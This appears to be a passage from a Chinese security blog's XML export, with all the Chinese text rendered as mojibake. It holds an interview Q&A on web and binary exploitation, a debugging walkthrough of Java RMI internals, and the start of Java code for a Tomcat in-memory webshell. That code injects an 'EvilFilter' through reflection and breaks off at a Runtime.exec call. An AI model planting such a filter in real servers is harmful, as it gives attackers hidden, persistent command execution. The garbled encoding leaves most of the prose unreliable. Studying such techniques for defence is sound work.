<td>å¿˜æ±‚äº†ï¼Œä¹Ÿæ˜¯kerburnetsåè®®çš„æ¼æ´</td>
</tr>
<tr>
<td>äº†è§£å“ªäº›JAVAæ¡†æ¶</td>
<td>Spring Spring Boot spring mvc shiro struts2 äº‘äº‘</td>
</tr>
<tr>
<td>è®²è®²Spring</td>
<td>IOC ä¸AOPï¼ŒDI æ„é€ æ–¹æ³•æ³¨å…¥ä¸setteræ³¨å…¥ï¼ŒAOPï¼ŒåŠ¨æ€ä»£ç†ï¼Œæ¨ªåˆ‡å…³æ³¨ç‚¹ã€åˆ‡é¢ã€é¢†åŸŸç­‰æ¦‚å¿µ</td>
</tr>
<tr>
<td>äº†è§£å“ªäº›PHPæ¡†æ¶</td>
<td>tp</td>
</tr>
<tr>
<td>æœ€è¿‘è·Ÿè¿‡å“ªäº›æ¼æ´</td>
<td>fastjson vmware workspace    spring security manager</td>
</tr>
<tr>
<td>JAVAç±»å‹æœºåˆ¶</td>
<td>çå‡ æŠŠé—®ï¼Œæ ¹æœ¬å°±æ²¡è¿™ç©æ„å„¿ï¼Œä½ æ˜¯è¦é—®ç±»åŠ è½½æœºåˆ¶è¿˜æ˜¯å¼ºå¼±ç±»å‹ï¼Ÿæˆ‘çœ‹è‡ªå·±éƒ½æ²¡ææ¸…æ¥š</td>
</tr>
<tr>
<td>å¦‚ä½•åšæºç å®¡è®¡</td>
<td>å·¥å…·æ‰«ã€ç¬¬ä¸‰æ–¹ä¾èµ–ã€è¿‡æ»¤å™¨ã€æ‹¦æˆªå™¨ã€æ‰¾å¯¹åº”ç±»å‹æ¼æ´çš„å…³é”®å­—ï¼Œè·Ÿè¸ªè°ƒç”¨é“¾</td>
</tr>
<tr>
<td>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€ä¹ˆæ‰¾</td>
<td>æ‰¾å…³é”®å­—mutipart FileInputStream FIle nioç±»å‹çš„Writersä¸Readersç­‰</td>
</tr>
<tr>
<td>è¿‡æ»¤å™¨ä¸æ‹¦æˆªå™¨çš„åŒºåˆ«</td>
<td>ä»¥å‰ç«¯è°ƒåº¦å™¨ä¸ºè½¬æŠ˜ç‚¹ï¼Œåœ¨å…¶å‰é¢è¢«ç§°ä¸ºè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨æ˜¯servletçš„æ¦‚å¿µï¼Œåœ¨tomcatä¸­ä¾é™„åœ¨pipelineä¸Šï¼Œæ‹¦æˆªå™¨æ˜¯springä¸­çš„æ¦‚å¿µï¼Œå…¶åœ¨å‰ç«¯æ§åˆ¶å™¨ä¹‹åè¯·æ±‚æ­£å¼åˆ°è¾¾servletçš„å‰åè¢«æ‰§è¡Œ</td>
</tr>
<tr>
<td>æŒ–è¿‡å“ªäº›å¤§çš„å¼€æºè½¯ä»¶çš„æ¼æ´</td>
<td>æ²¡æŒ–è¿‡</td>
</tr>
<tr>
<td>å¦‚ä½•æé«˜log4j2 shellæ¼æ´çš„æ£€æµ‹æ•ˆç‡</td>
<td>å¤šçº¿ç¨‹ é«˜å¹¶å‘ å¤šæ¬¡è¯·æ±‚ä¸€æ¬¡éªŒè¯ç­‰</td>
</tr>
<tr>
<td>å¦‚ä½•æé«˜log4j2æ¼æ´éªŒè¯PoCçš„å‡†ç¡®æ€§</td>
<td>ä½ çŒœ</td>
</tr>
<tr>
<td>xlstæ³¨å…¥</td>
<td></td>
</tr>
<tr>
<td>æœ‰ä¸€ä¸ªjavaç«™ç‚¹çš„webshellï¼Œç¿»éäº†æ‰€æœ‰é…ç½®æ–‡ä»¶éƒ½æ²¡æœ‰ç¿»åˆ°æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œé—®è¿™äº›ä¿¡æ¯å¯èƒ½åœ¨å“ªé‡Œ</td>
<td>ç¯å¢ƒå˜é‡æˆ–è€…å†…å­˜ä¸­æˆ–è€…å…¶ä»–çš„æ•°æ®åº“é‡Œ</td>
</tr>
<tr>
<td>spring boootç«™ç‚¹æš´éœ²äº†ä¸€äº›endpointï¼Œå¦‚envæ–‡ä»¶æ³„æ¼ï¼Œä½†æ˜¯ç”¨æˆ·åå¯†ç æ˜¯*** å¦‚ä½•è·å–æ˜æ–‡</td>
<td>heepdump  åˆ©ç”¨ä¸€äº›å…¶ä»–çš„ä¾èµ–</td>
</tr>
<tr>
<td>.netåºåˆ—åŒ–</td>
<td>ä¸ä¼š</td>
</tr>
<tr>
<td>ååºåˆ—åŒ–æ”»å‡»ä¸æˆåŠŸçš„åŸå› </td>
<td>jdkç‰ˆæœ¬ä¸å…è®¸ï¼Œé…ç½®äº†jep290ç­–ç•¥ï¼Œå†…ç½‘ä¸å‡ºç½‘ï¼Œserializationuidä¸åŒ¹é…</td>
</tr>
<tr>
<td>jndié«˜ç‰ˆæœ¬å¦‚ä½•ç»•è¿‡</td>
<td>ååºåˆ—åŒ–çš„æœ¬è´¨éœ€è¦æˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ç±»åœ¨ç›®æ ‡æœ¬åœ°å­˜åœ¨ï¼Œè‹¥æœ‰ä¸€ä¸ªç±»æ˜¯ä¸šåŠ¡ç³»ç»Ÿå¿…é¡»ä½¿ç”¨çš„ç±»ï¼Œé‚£ä¹ˆè¯¥ç±»å°±ä¸å¯èƒ½å‡ºç°åœ¨é»‘åå•ä¸­ï¼Œè‡ªç„¶å°±å¯ä»¥è¢«ç”¨æ¥è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ï¼Œå¦‚tomcatä¸­çš„ BeanFactoryç±»</td>
</tr>
<tr>
<td>raspå¦‚ä½•ç»•è¿‡</td>
<td>å¦èµ·ä¸€ä¸ªæ–°çš„è¿›ç¨‹ ä½¿ç”¨jni hookæ‰rasp hook sinkç‚¹çš„å‡½æ•°</td>
</tr>
<tr>
<td>fastjsonå¦‚ä½•ç»•è¿‡</td>
<td>unicode  hex  çŸ­åˆ’çº¿ç©ºæ ¼ç­‰</td>
</tr>
<tr>
<td>å¦‚ä½•æŒ–æ˜æœªæˆæƒæ¼æ´</td>
<td>ç™½ç›’ä¸é»‘ç›’</td>
</tr>
<tr>
<td>æœ‰webshell å¯ä»¥æ‰§è¡Œä»»æ„javaä»£ç ï¼Œå¦‚ä½•æŸ¥çœ‹webé¡¹ç›®ç»å¯¹è·¯å¾„</td>
<td>ç›´æ¥æ‰§è¡Œå‘½ä»¤netstat æŸ¥çœ‹pid  lsofæŸ¥çœ‹å…³è”æ–‡ä»¶  ç›´æ¥ç¿»é…ç½®æ–‡ä»¶  æŸ¥çœ‹classpath</td>
</tr>
</tbody></table>
<h1 id="äºŒè¿›åˆ¶æ–¹å‘ã€Learningã€‘"><a href="#äºŒè¿›åˆ¶æ–¹å‘ã€Learningã€‘" class="headerlink" title="äºŒè¿›åˆ¶æ–¹å‘ã€Learningã€‘"></a>äºŒè¿›åˆ¶æ–¹å‘ã€Learningã€‘</h1><table>
<thead>
<tr>
<th>é¢˜ç›®</th>
<th>å›ç­”</th>
</tr>
</thead>
<tbody><tr>
<td>SEHæ˜¯ä»€ä¹ˆ</td>
<td></td>
</tr>
<tr>
<td>è®²è®²DEP</td>
<td></td>
</tr>
<tr>
<td>CanaryåŸç†ã€ç»•è¿‡ç­‰</td>
<td></td>
</tr>
<tr>
<td>å †æº¢å‡ºæ¼æ´åŸç†</td>
<td></td>
</tr>
<tr>
<td>æ ˆæº¢å‡ºæ¼æ´åŸç†</td>
<td></td>
</tr>
<tr>
<td>æŒ–æ˜è¿‡å“ªäº›å•†ä¸šäº§å“æ¼æ´</td>
<td></td>
</tr>
<tr>
<td>ç”¨è¿‡å“ªäº›è°ƒè¯•å™¨</td>
<td></td>
</tr>
<tr>
<td>fast bin  small bin  large bin unsorted binå¼‚åŒï¼Œchunkä»€ä¹ˆæ—¶å€™è¿›å…¥unsorted bin</td>
<td></td>
</tr>
<tr>
<td>ROPã€SROP</td>
<td></td>
</tr>
<tr>
<td>calloc ä¸mallocçš„å¼‚åŒ</td>
<td></td>
</tr>
<tr>
<td>Windowsæœ‰å“ªäº›ç»„ä»¶</td>
<td></td>
</tr>
<tr>
<td>å¤šè¿›ç¨‹å¦‚ä½•ä¿æŠ¤æ•°æ®</td>
<td>é”â€¦.</td>
</tr>
<tr>
<td>CPUè°ƒåº¦ç®—æ³•</td>
<td>æ—¶é—´ç‰‡è½®è®­ã€ä¼˜å…ˆçº§ã€å…ˆåˆ°å…ˆæœåŠ¡ã€æœ€çŸ­æ—¶é—´ä¼˜å…ˆç­‰ç®—æ³•</td>
</tr>
<tr>
<td>ä¸‰ç§å‡½æ•°è°ƒç”¨çº¦å®šçš„å¼‚åŒ</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>é¢è¯•é¢˜</category>
      </categories>
      <tags>
        <tag>é¢è¯•é¢˜</tag>
        <tag>å®‰å…¨ç ”ç©¶</tag>
        <tag>Web</tag>
        <tag>äºŒè¿›åˆ¶</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä»£ç å±‚é¢çœ‹RMIè§„èŒƒçš„å®ç°ä¸æ”»å‡»åŸç†ï¼ˆä¸‰ï¼‰</title>
    <url>/archives/b78ab3b1.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%89%EF%BC%89">TOC</a></p>
<p>ä¹¦æ¥ä¸Šæ–‡ï¼ŒJRMPåè®®çš„çš„æ¡æ‰‹è¿‡ç¨‹å·²ç»ç»“æŸäº†ï¼Œä¸‹é¢å°±æ˜¯æ­£å¼çš„æºå¸¦keyå»æ³¨å†Œä¸­å¿ƒæŸ¥è¯¢æ˜¯å¦å­˜åœ¨å¯¹è±¡äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f491fd63defa7f9645b0bcf86b96af5c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ˜¨å¤©çš„æ‰€æœ‰åˆ†æéƒ½æ˜¯åœ¨1å¤„çš„ä»£ç é‡Œé¢ï¼Œä»Šå¤©è¿›å…¥åˆ°2å¤„<br>é¦–å…ˆç‹ç–‘åˆ°çš„æ˜¯118ï¼Œ119è¡Œæœ‰ä¸€ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œé¦–å…ˆè¿˜æ˜¯è·å–äº†ä¸€ä¸ªè¾“å‡ºæµï¼Œç„¶åå‘é‡Œé¢å†™äº†ä¸€ä¸ªå¯¹è±¡<code>$param_String_1</code>ï¼Œå½“æ—¶è®²é“ç†è¿™ä¸ªå‚æ•°æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªå¯¹è±¡å•Šï¼Ÿè¿™æ˜¯æˆ‘æœ€å¼€å§‹ç–‘æƒ‘çš„ç‚¹ï¼Œä½†æˆ‘ä»¬è¦çŸ¥é“åœ¨javaä¸­<code>String</code>ç±»å‹å°±æ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸æ˜¯ä¸€ç§å…ƒç±»å‹ï¼Œå…¶æ˜¯ä¸€ç§åŒ…è£…ç±»ã€‚ã€‚<br>ç„¶åæˆ‘ä»¬è¿›å…¥åˆ°<code>invoke</code>æ–¹æ³•é‡Œé¢å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aabcd8f6377850df6273f5685c1385bb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¯«æ— ç–‘é—®ï¼Œtryä»£ç å—é‡Œé¢çš„è¯­å¥æ˜¯é‡ç‚¹ï¼Œåé¢éƒ½æ˜¯äº›å¼‚å¸¸æ•è·çš„è¯­å¥ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/660c3aea8f9ee02f426fa40f9b0ae3b4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿›å…¥äº†<code>StreamRemoteCall#executeCall</code><br>é¦–å…ˆå¯¹<code>out</code>è¿›è¡Œåˆ¤ç©ºï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯ä¸ä¸ºç©ºçš„ï¼Œæˆ‘ä»¬åˆšåˆšæ‰å¾€outé‡Œå†™äº†å¯¹è±¡ï¼Œç„¶åè·å–äº†ä¸€ä¸ª<code>DGCAckHandler</code>å¯¹è±¡ï¼Œå—¯ï¼Œæˆ‘çœ‹äº†é‡Œé¢çš„ä»£ç ï¼Œè¿™æ ·ç›´æ¥è·å–çš„å¤„ç†å™¨ä¸ºç©ºï¼Œåº”è¯¥ä¼šåªæ˜¯æƒ³è¦è¿™ä¹ˆä¸ªå¯¹è±¡åé¢è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ã€‚<br>ç„¶åè°ƒç”¨<code>releaseOutputStream</code>æ–¹æ³•è¿™ç©æ„å„¿æ‰“çœ¼ä¸€çœ‹å°±çŸ¥é“æ˜¯é‡Šæ”¾è¾“å‡ºæµçš„æ„æ€ï¼Œè‡³äºå…·ä½“åŠŸèƒ½æˆ‘ä»¬è¿˜è¦çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c498017c916e88b689e44015854513e2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆè¿›è¡Œäº†åˆ¤ç©ºï¼Œä¸€æ ·çš„é“ç†å‘å®šä¸ä¸ºç©ºï¼Œç„¶åæ‰§è¡Œ<code>out.flush</code>ï¼Œæœ‰äº†æ˜¨å¤©çš„ç†è®ºæ”¯æ’‘æˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“ï¼Œåªä¸€æ­¥æ‰§è¡Œå®Œä¹‹åè¾“å‡ºç¼“å†²åŒºçš„å†…å®¹è®²è¢«å‘é€åˆ°æ³¨å†Œä¸­å¿ƒï¼ŒwiresharkæŠ“åŒ…æŸ¥çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8461be7ed4b0e86f3249fc21f3388120.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶ï¼Œæœ‰å‘é€ï¼Œç„¶åæ³¨å†Œä¸­å¿ƒä¹Ÿæœ‰å›åŒ…ã€‚è§‚å¯Ÿåˆ°å‘é€çš„æŠ¥æ–‡ä»¥<code>aced0005</code>æ‰“å¤´ï¼Œæ˜¯åºåˆ—åŒ–æ²¡è·‘äº†ï¼Œçœ‹åˆ°marketä¹ŸåŒ…å«åœ¨é‡Œé¢ã€‚<br>ç„¶ååº”è¯¥å°±æ˜¯å¤„ç†è¿”å›åŒ…çš„è¿‡ç¨‹äº†ã€‚<br>åœ¨<code>out.flush</code>æ‰§è¡Œå®Œæ¯•åï¼Œçœ‹åˆ°åˆæ‰§è¡Œäº†<code>out.done</code>ï¼Œè·Ÿè¿›å»çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a91e3d69bc923f3b36ca5561e8c744bc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆå¯¹<code>dgcAckHandler</code>è¿›è¡Œåˆ¤ç©ºï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬åˆšæ‰è·å–è¿‡ï¼Œè¿™ç©æ„å°±æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥é‡Œé¢çš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œä¸è¿‡çœ‹è¿™æ„æ€æ˜¯è¦å¼€å§‹ä¸€ä¸ªè®¡æ—¶å™¨ã€‚<br>å›åˆ°ä¸Šä¸€å±‚ï¼Œæ‰§è¡Œåˆ°<code>conn.releaseOutputStream()</code>ï¼Œè·Ÿè¿›å»çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8c65541c45e15e2bd2e16a53f1d4060d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œåˆflushä¸€æ¬¡å‡ ä¸ªæ„æ€ï¼Œä¸å¦¨æ‰§è¡Œä¸€ä¸‹ç„¶åçœ‹çœ‹è¿˜æœ‰æ²¡æœ‰æ•°æ®å‘é€äº†ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3cb76b3bd1a6e7840fc51714fcca6bbb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ²¡æœ‰æ–°çš„æ•°æ®è¢«å‘é€ï¼Œæ‰€ä»¥è¿™é‡Œä¼°è®¡æ˜¯ä¸ºäº†ç¡®ä¿ç¼“å†²åŒºçš„æ‰€æœ‰æ•°æ®éƒ½è¢«æ¸…ç©ºã€‚ã€‚<br>ç„¶åå°†<code>out</code>è®¾ç½®ä¸º<code>null</code><br>å•æ­¥å‘ä¸‹å›åˆ°<code>StreamRemoteCall#executeCall</code>ç¬¬239è¡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c77d25df5f97087bbcfcdedc39074e1d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ›å»ºè¾“å…¥æµå’¯ã€‚ã€‚ã€‚<br>ä¸è¿‡ä¹‹å‰æˆ‘ä»¬è¿˜æ˜¯çœ‹ä¸€ä¸‹è¾“å…¥é•¿ä»€ä¹ˆæ ·å§ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fa936111a545337626fa373d8f5a931d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/81515327f8a1b7cf48c4ae15c37aaf52.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ä¹Ÿæ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚<br>ç„¶åä»£ç è¯»å–ä¸€ä¸ªå­—èŠ‚èµ‹å€¼ç»™<code>op</code>ï¼Œä¹Ÿå°±æ˜¯<code>0x51</code>ï¼Œåè¿›åˆ¶å°±æ˜¯81ï¼Œç„¶ååˆ¤æ–­ç­‰ä¸ç­‰äº<code>TransportConstants.Return</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9b5450c22355093c7599c7b4a4f05d1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾ç­‰äºã€‚<br>ç„¶ååˆè°ƒç”¨äº†ä¸€æ¬¡æœ¬ç±»çš„è·å–è¾“å…¥æµæ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/db1b686461ad7e0fb2e9e19585254ee4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹æ ·å­ä¸»è¦è¿˜æ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿‡æ»¤å™¨ï¼Œå¦‚æœå­˜åœ¨å°±è°ƒç”¨è¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤ï¼Œä¸Šç½‘æœäº†æœè¿™ä¸ªè¿‡æ»¤å™¨å°±æ˜¯ä¸ºäº†ååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å®‰å…¨æ€§è€ƒè™‘ï¼Œè§„å®šäº†å“ªäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œå“ªäº›ç±»ä¸å¯ä»¥ã€‚è¿™é‡Œæ²¡å•¥ç”¨çš„æ„Ÿè§‰ï¼Œåæ­£æ²¡æœ‰å®šä¹‰è¿‡è¿‡æ»¤å™¨ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸ä¼šè¢«æ‰§è¡Œã€‚å˜´å‘¨æ”¾å›ä¸€ä¸ªç©ºçš„æµï¼Œä½†æ˜¯åœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åä¹Ÿæ²¡æœ‰å˜é‡æ¥æ”¶ï¼Œæ‰€ä»¥å¯¹æˆ‘ä»¬çš„é€»è¾‘æ²¡å•¥å½±å“ï¼Œä¸è¿‡ä»è¿™å„¿ä¹Ÿå¯ä»¥çœ‹åˆ°å¯ä»¥åœ¨è¿™å„¿è®¾ç½®è¿‡æ»¤å™¨æ¥é¿å…å±é™©çš„ååºåˆ—åŒ–æ“ä½œã€‚<br>å›åˆ°ä¸Šä¸€å±‚ï¼Œå†è¯»ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚æŒ‰ç…§è°ƒè¯•çš„ç»“æœè¯»å‡ºæ¥çš„æ•°æ®æ˜¯1ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/182e6bef6f9f7bc2de4d079086301303.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä¸æå§<br>ã€‚ã€‚ã€‚<br>åŸæ¥è¿™ä¸ª<code>readByte</code>æ˜¯<code>in</code>çš„æ–¹æ³•ï¼Œè¿™ä¸ªinä¹Ÿå°±æ˜¯åˆšæ‰<code>getInputStream</code>èµ‹å€¼çš„ï¼Œè®²é“ç†è¿™æ—¶å€™è·å–çš„è¾“å…¥æµè¿åº”è¯¥å•¥ä¹Ÿæ²¡æœ‰æ‰å¯¹ã€‚ã€‚ã€‚<br>æˆ‘æ›´ä¸ç†è§£äº†ã€‚<br>ç„¶åæ˜¯<code>readID</code>ä¸çŸ¥é“è¯»äº†ä¸ªä»€ä¹ˆç¥å¥‡çš„ä¸œè¥¿ã€‚<br>ç„¶åè¿›å…¥åˆ°<code>switch</code>ç»“æ„ä¸­ï¼Œæ ¹æ®<code>returnType</code>åˆ¤æ–­è¿›å…¥å“ªä¸€ä¸ªé€»è¾‘ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹æ˜¯è¿›å…¥è¿™ä¸€ä¸ª<br><img src="https://i-blog.csdnimg.cn/blog_migrate/143624325c6d29e5d53fdb6f55cfb667.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„ï¼Œé—®å°±æ˜¯è°ƒè¯•å‡ºæ¥çš„ï¼Œ<br>è¿™ç›´æ¥breakäº†å•Šã€‚ã€‚ã€‚<br>åˆ°äº†è¿™é‡Œä¸€ç›´å¾€ä¸‹å•æ­¥æ‰§è¡Œï¼Œå‘ç°é€€å‡ºäº†invokeæ–¹æ³•ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯ååºåˆ—åŒ–æ³¨å†Œä¸­å¿ƒå‘é€è¿‡æ¥çš„stubå¯¹è±¡äº†å§ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/36f47cd82c6de1c8ad06791a21335421.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶ï¼Œé¦–å…ˆè·å–äº†è¾“å…¥æµï¼Œç„¶åæ‰§è¡Œäº†<code>readObject</code>æ–¹æ³•è¿›è¡Œå‘åºåˆ—åŒ–ï¼Œç„¶åæ‰§è¡Œ<code>ref.done</code>ï¼Œå¦‚æœæˆ‘ä»¬çŒœé”™ç°åœ¨è¿™ä¸€æ­¥è‚¯å®šæ˜¯è¦å‘é€æŒ¥æ‰‹åŒ…äº†ï¼Œç„¶åæˆ‘ä¸€å±‚ä¸€å±‚çš„å‘é‡Œé¢è·Ÿè¿›åˆ°äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9a3a63e3011ba0be67c80407a5b15e59.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä¸€ä¸ªä¸€ä¸ªè¿›å»çœ‹ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4cf7c9fa99a559f157c80e829b58c7af.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªå‡½æ•°é‡Œé¢æœ‰äº†ä¸€äº›æ–°çš„æ•°æ®ï¼Œçœ‹åˆ°é‡ç‚¹ä¿¡æ¯æ˜¯æœ‰ç«¯å£å’Œipä¿¡æ¯ã€‚è¯æ˜æºç«¯å£æˆ–è€…ç›®æ ‡ç«¯å£è¦å‘ç”Ÿå˜åŒ–äº†ï¼Œè‡³äºåˆ°åº•æ˜¯æºç«¯å£è¿˜æ˜¯ç›®æ ‡ç«¯å£æˆ‘æ›´å€¾å‘äºæºç«¯å£ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯çš„è¯·æ±‚ç«¯å£æœª58221ï¼Œå› ä¸ºæ­¤æ—¶è¿˜æ²¡æœ‰å¯¹æ³¨å†Œä¸­å¿ƒå‘é€å›æ¥çš„æ•°æ®è¿›è¡Œè§£æè°ƒç”¨ï¼Œé‚£ä¹ˆä¹Ÿå°±è¿˜ä¸çŸ¥é“å¯¹è±¡æœåŠ¡å™¨æ‰€åœ¨çš„ä¸»æœºä»¥åŠç«¯å£ï¼Œè¿™é‡Œè®²é“ç†åªèƒ½æ˜¯å®¢æˆ·ç«¯çš„ç«¯å£ã€‚</p>
<p>çœŸæ˜¯è‰äº†ä¸ªå¤§ç‡ï¼Œï¼Œä¸Šé¢ä¸€æ®µçš„åæ´—å®Œå…¨æ˜¯åœ¨æ‰¯çŠŠå­ã€‚ã€‚ã€‚ã€‚åƒä¸‡ä¸èƒ½å½“çœŸï¼Œè¿™ä¸ª58221ç«¯å£å°±æ˜¯æœåŠ¡å™¨çš„ç«¯å£ï¼Œæˆ‘è£‚å¼€äº†ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨<code>registerRefs</code>æ–¹æ³•é‡Œé¢ï¼Œå­˜æ ¹å·²ç»è¢«è§£æäº†ï¼Œæˆ‘è‰ã€‚è¯´æ¥ä¹Ÿå¯¹ï¼Œè¿™ä¸ªæ–¹æ³•åé¢å°±æ”¹è¿”å›äº†ï¼Œloogupå‡½æ•°å°±ç»“æŸäº†ï¼Œå®¢æˆ·ç«¯è¿˜æ²¡æœ‰å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œæƒ³æƒ³ä¹Ÿæ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œè¿™æ‰å¯¹å˜›ã€‚ä»Šå¤©å°±åˆ°è¿™é‡Œï¼Œå…¶ä»–æ˜æ—¥åœ¨æ¥ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚è¿œç¨‹æ–¹æ³•çš„è¿‡ç¨‹ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>æ‰‹å†™ä¸€ä¸ªTomcat Filterç±»å‹å†…å­˜é©¬</title>
    <url>/archives/f0f0aa4f.html</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            è·å–StandardContextå¯¹è±¡</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è·å–StandardContextå¯¹è±¡&quot;</span>);</span><br><span class="line"><span class="comment">//            Field request = req.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//            request.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Request request1 = (Request) request.get(request);</span></span><br><span class="line"><span class="comment">//            StandardContext context1 = (StandardContext) request1.getContext();</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            å°†EvilFilteræ·»åŠ åˆ°FilterDef</span></span><br><span class="line">            System.out.println(<span class="string">&quot;å°†EvilFilteræ·»åŠ åˆ°FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">             <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span 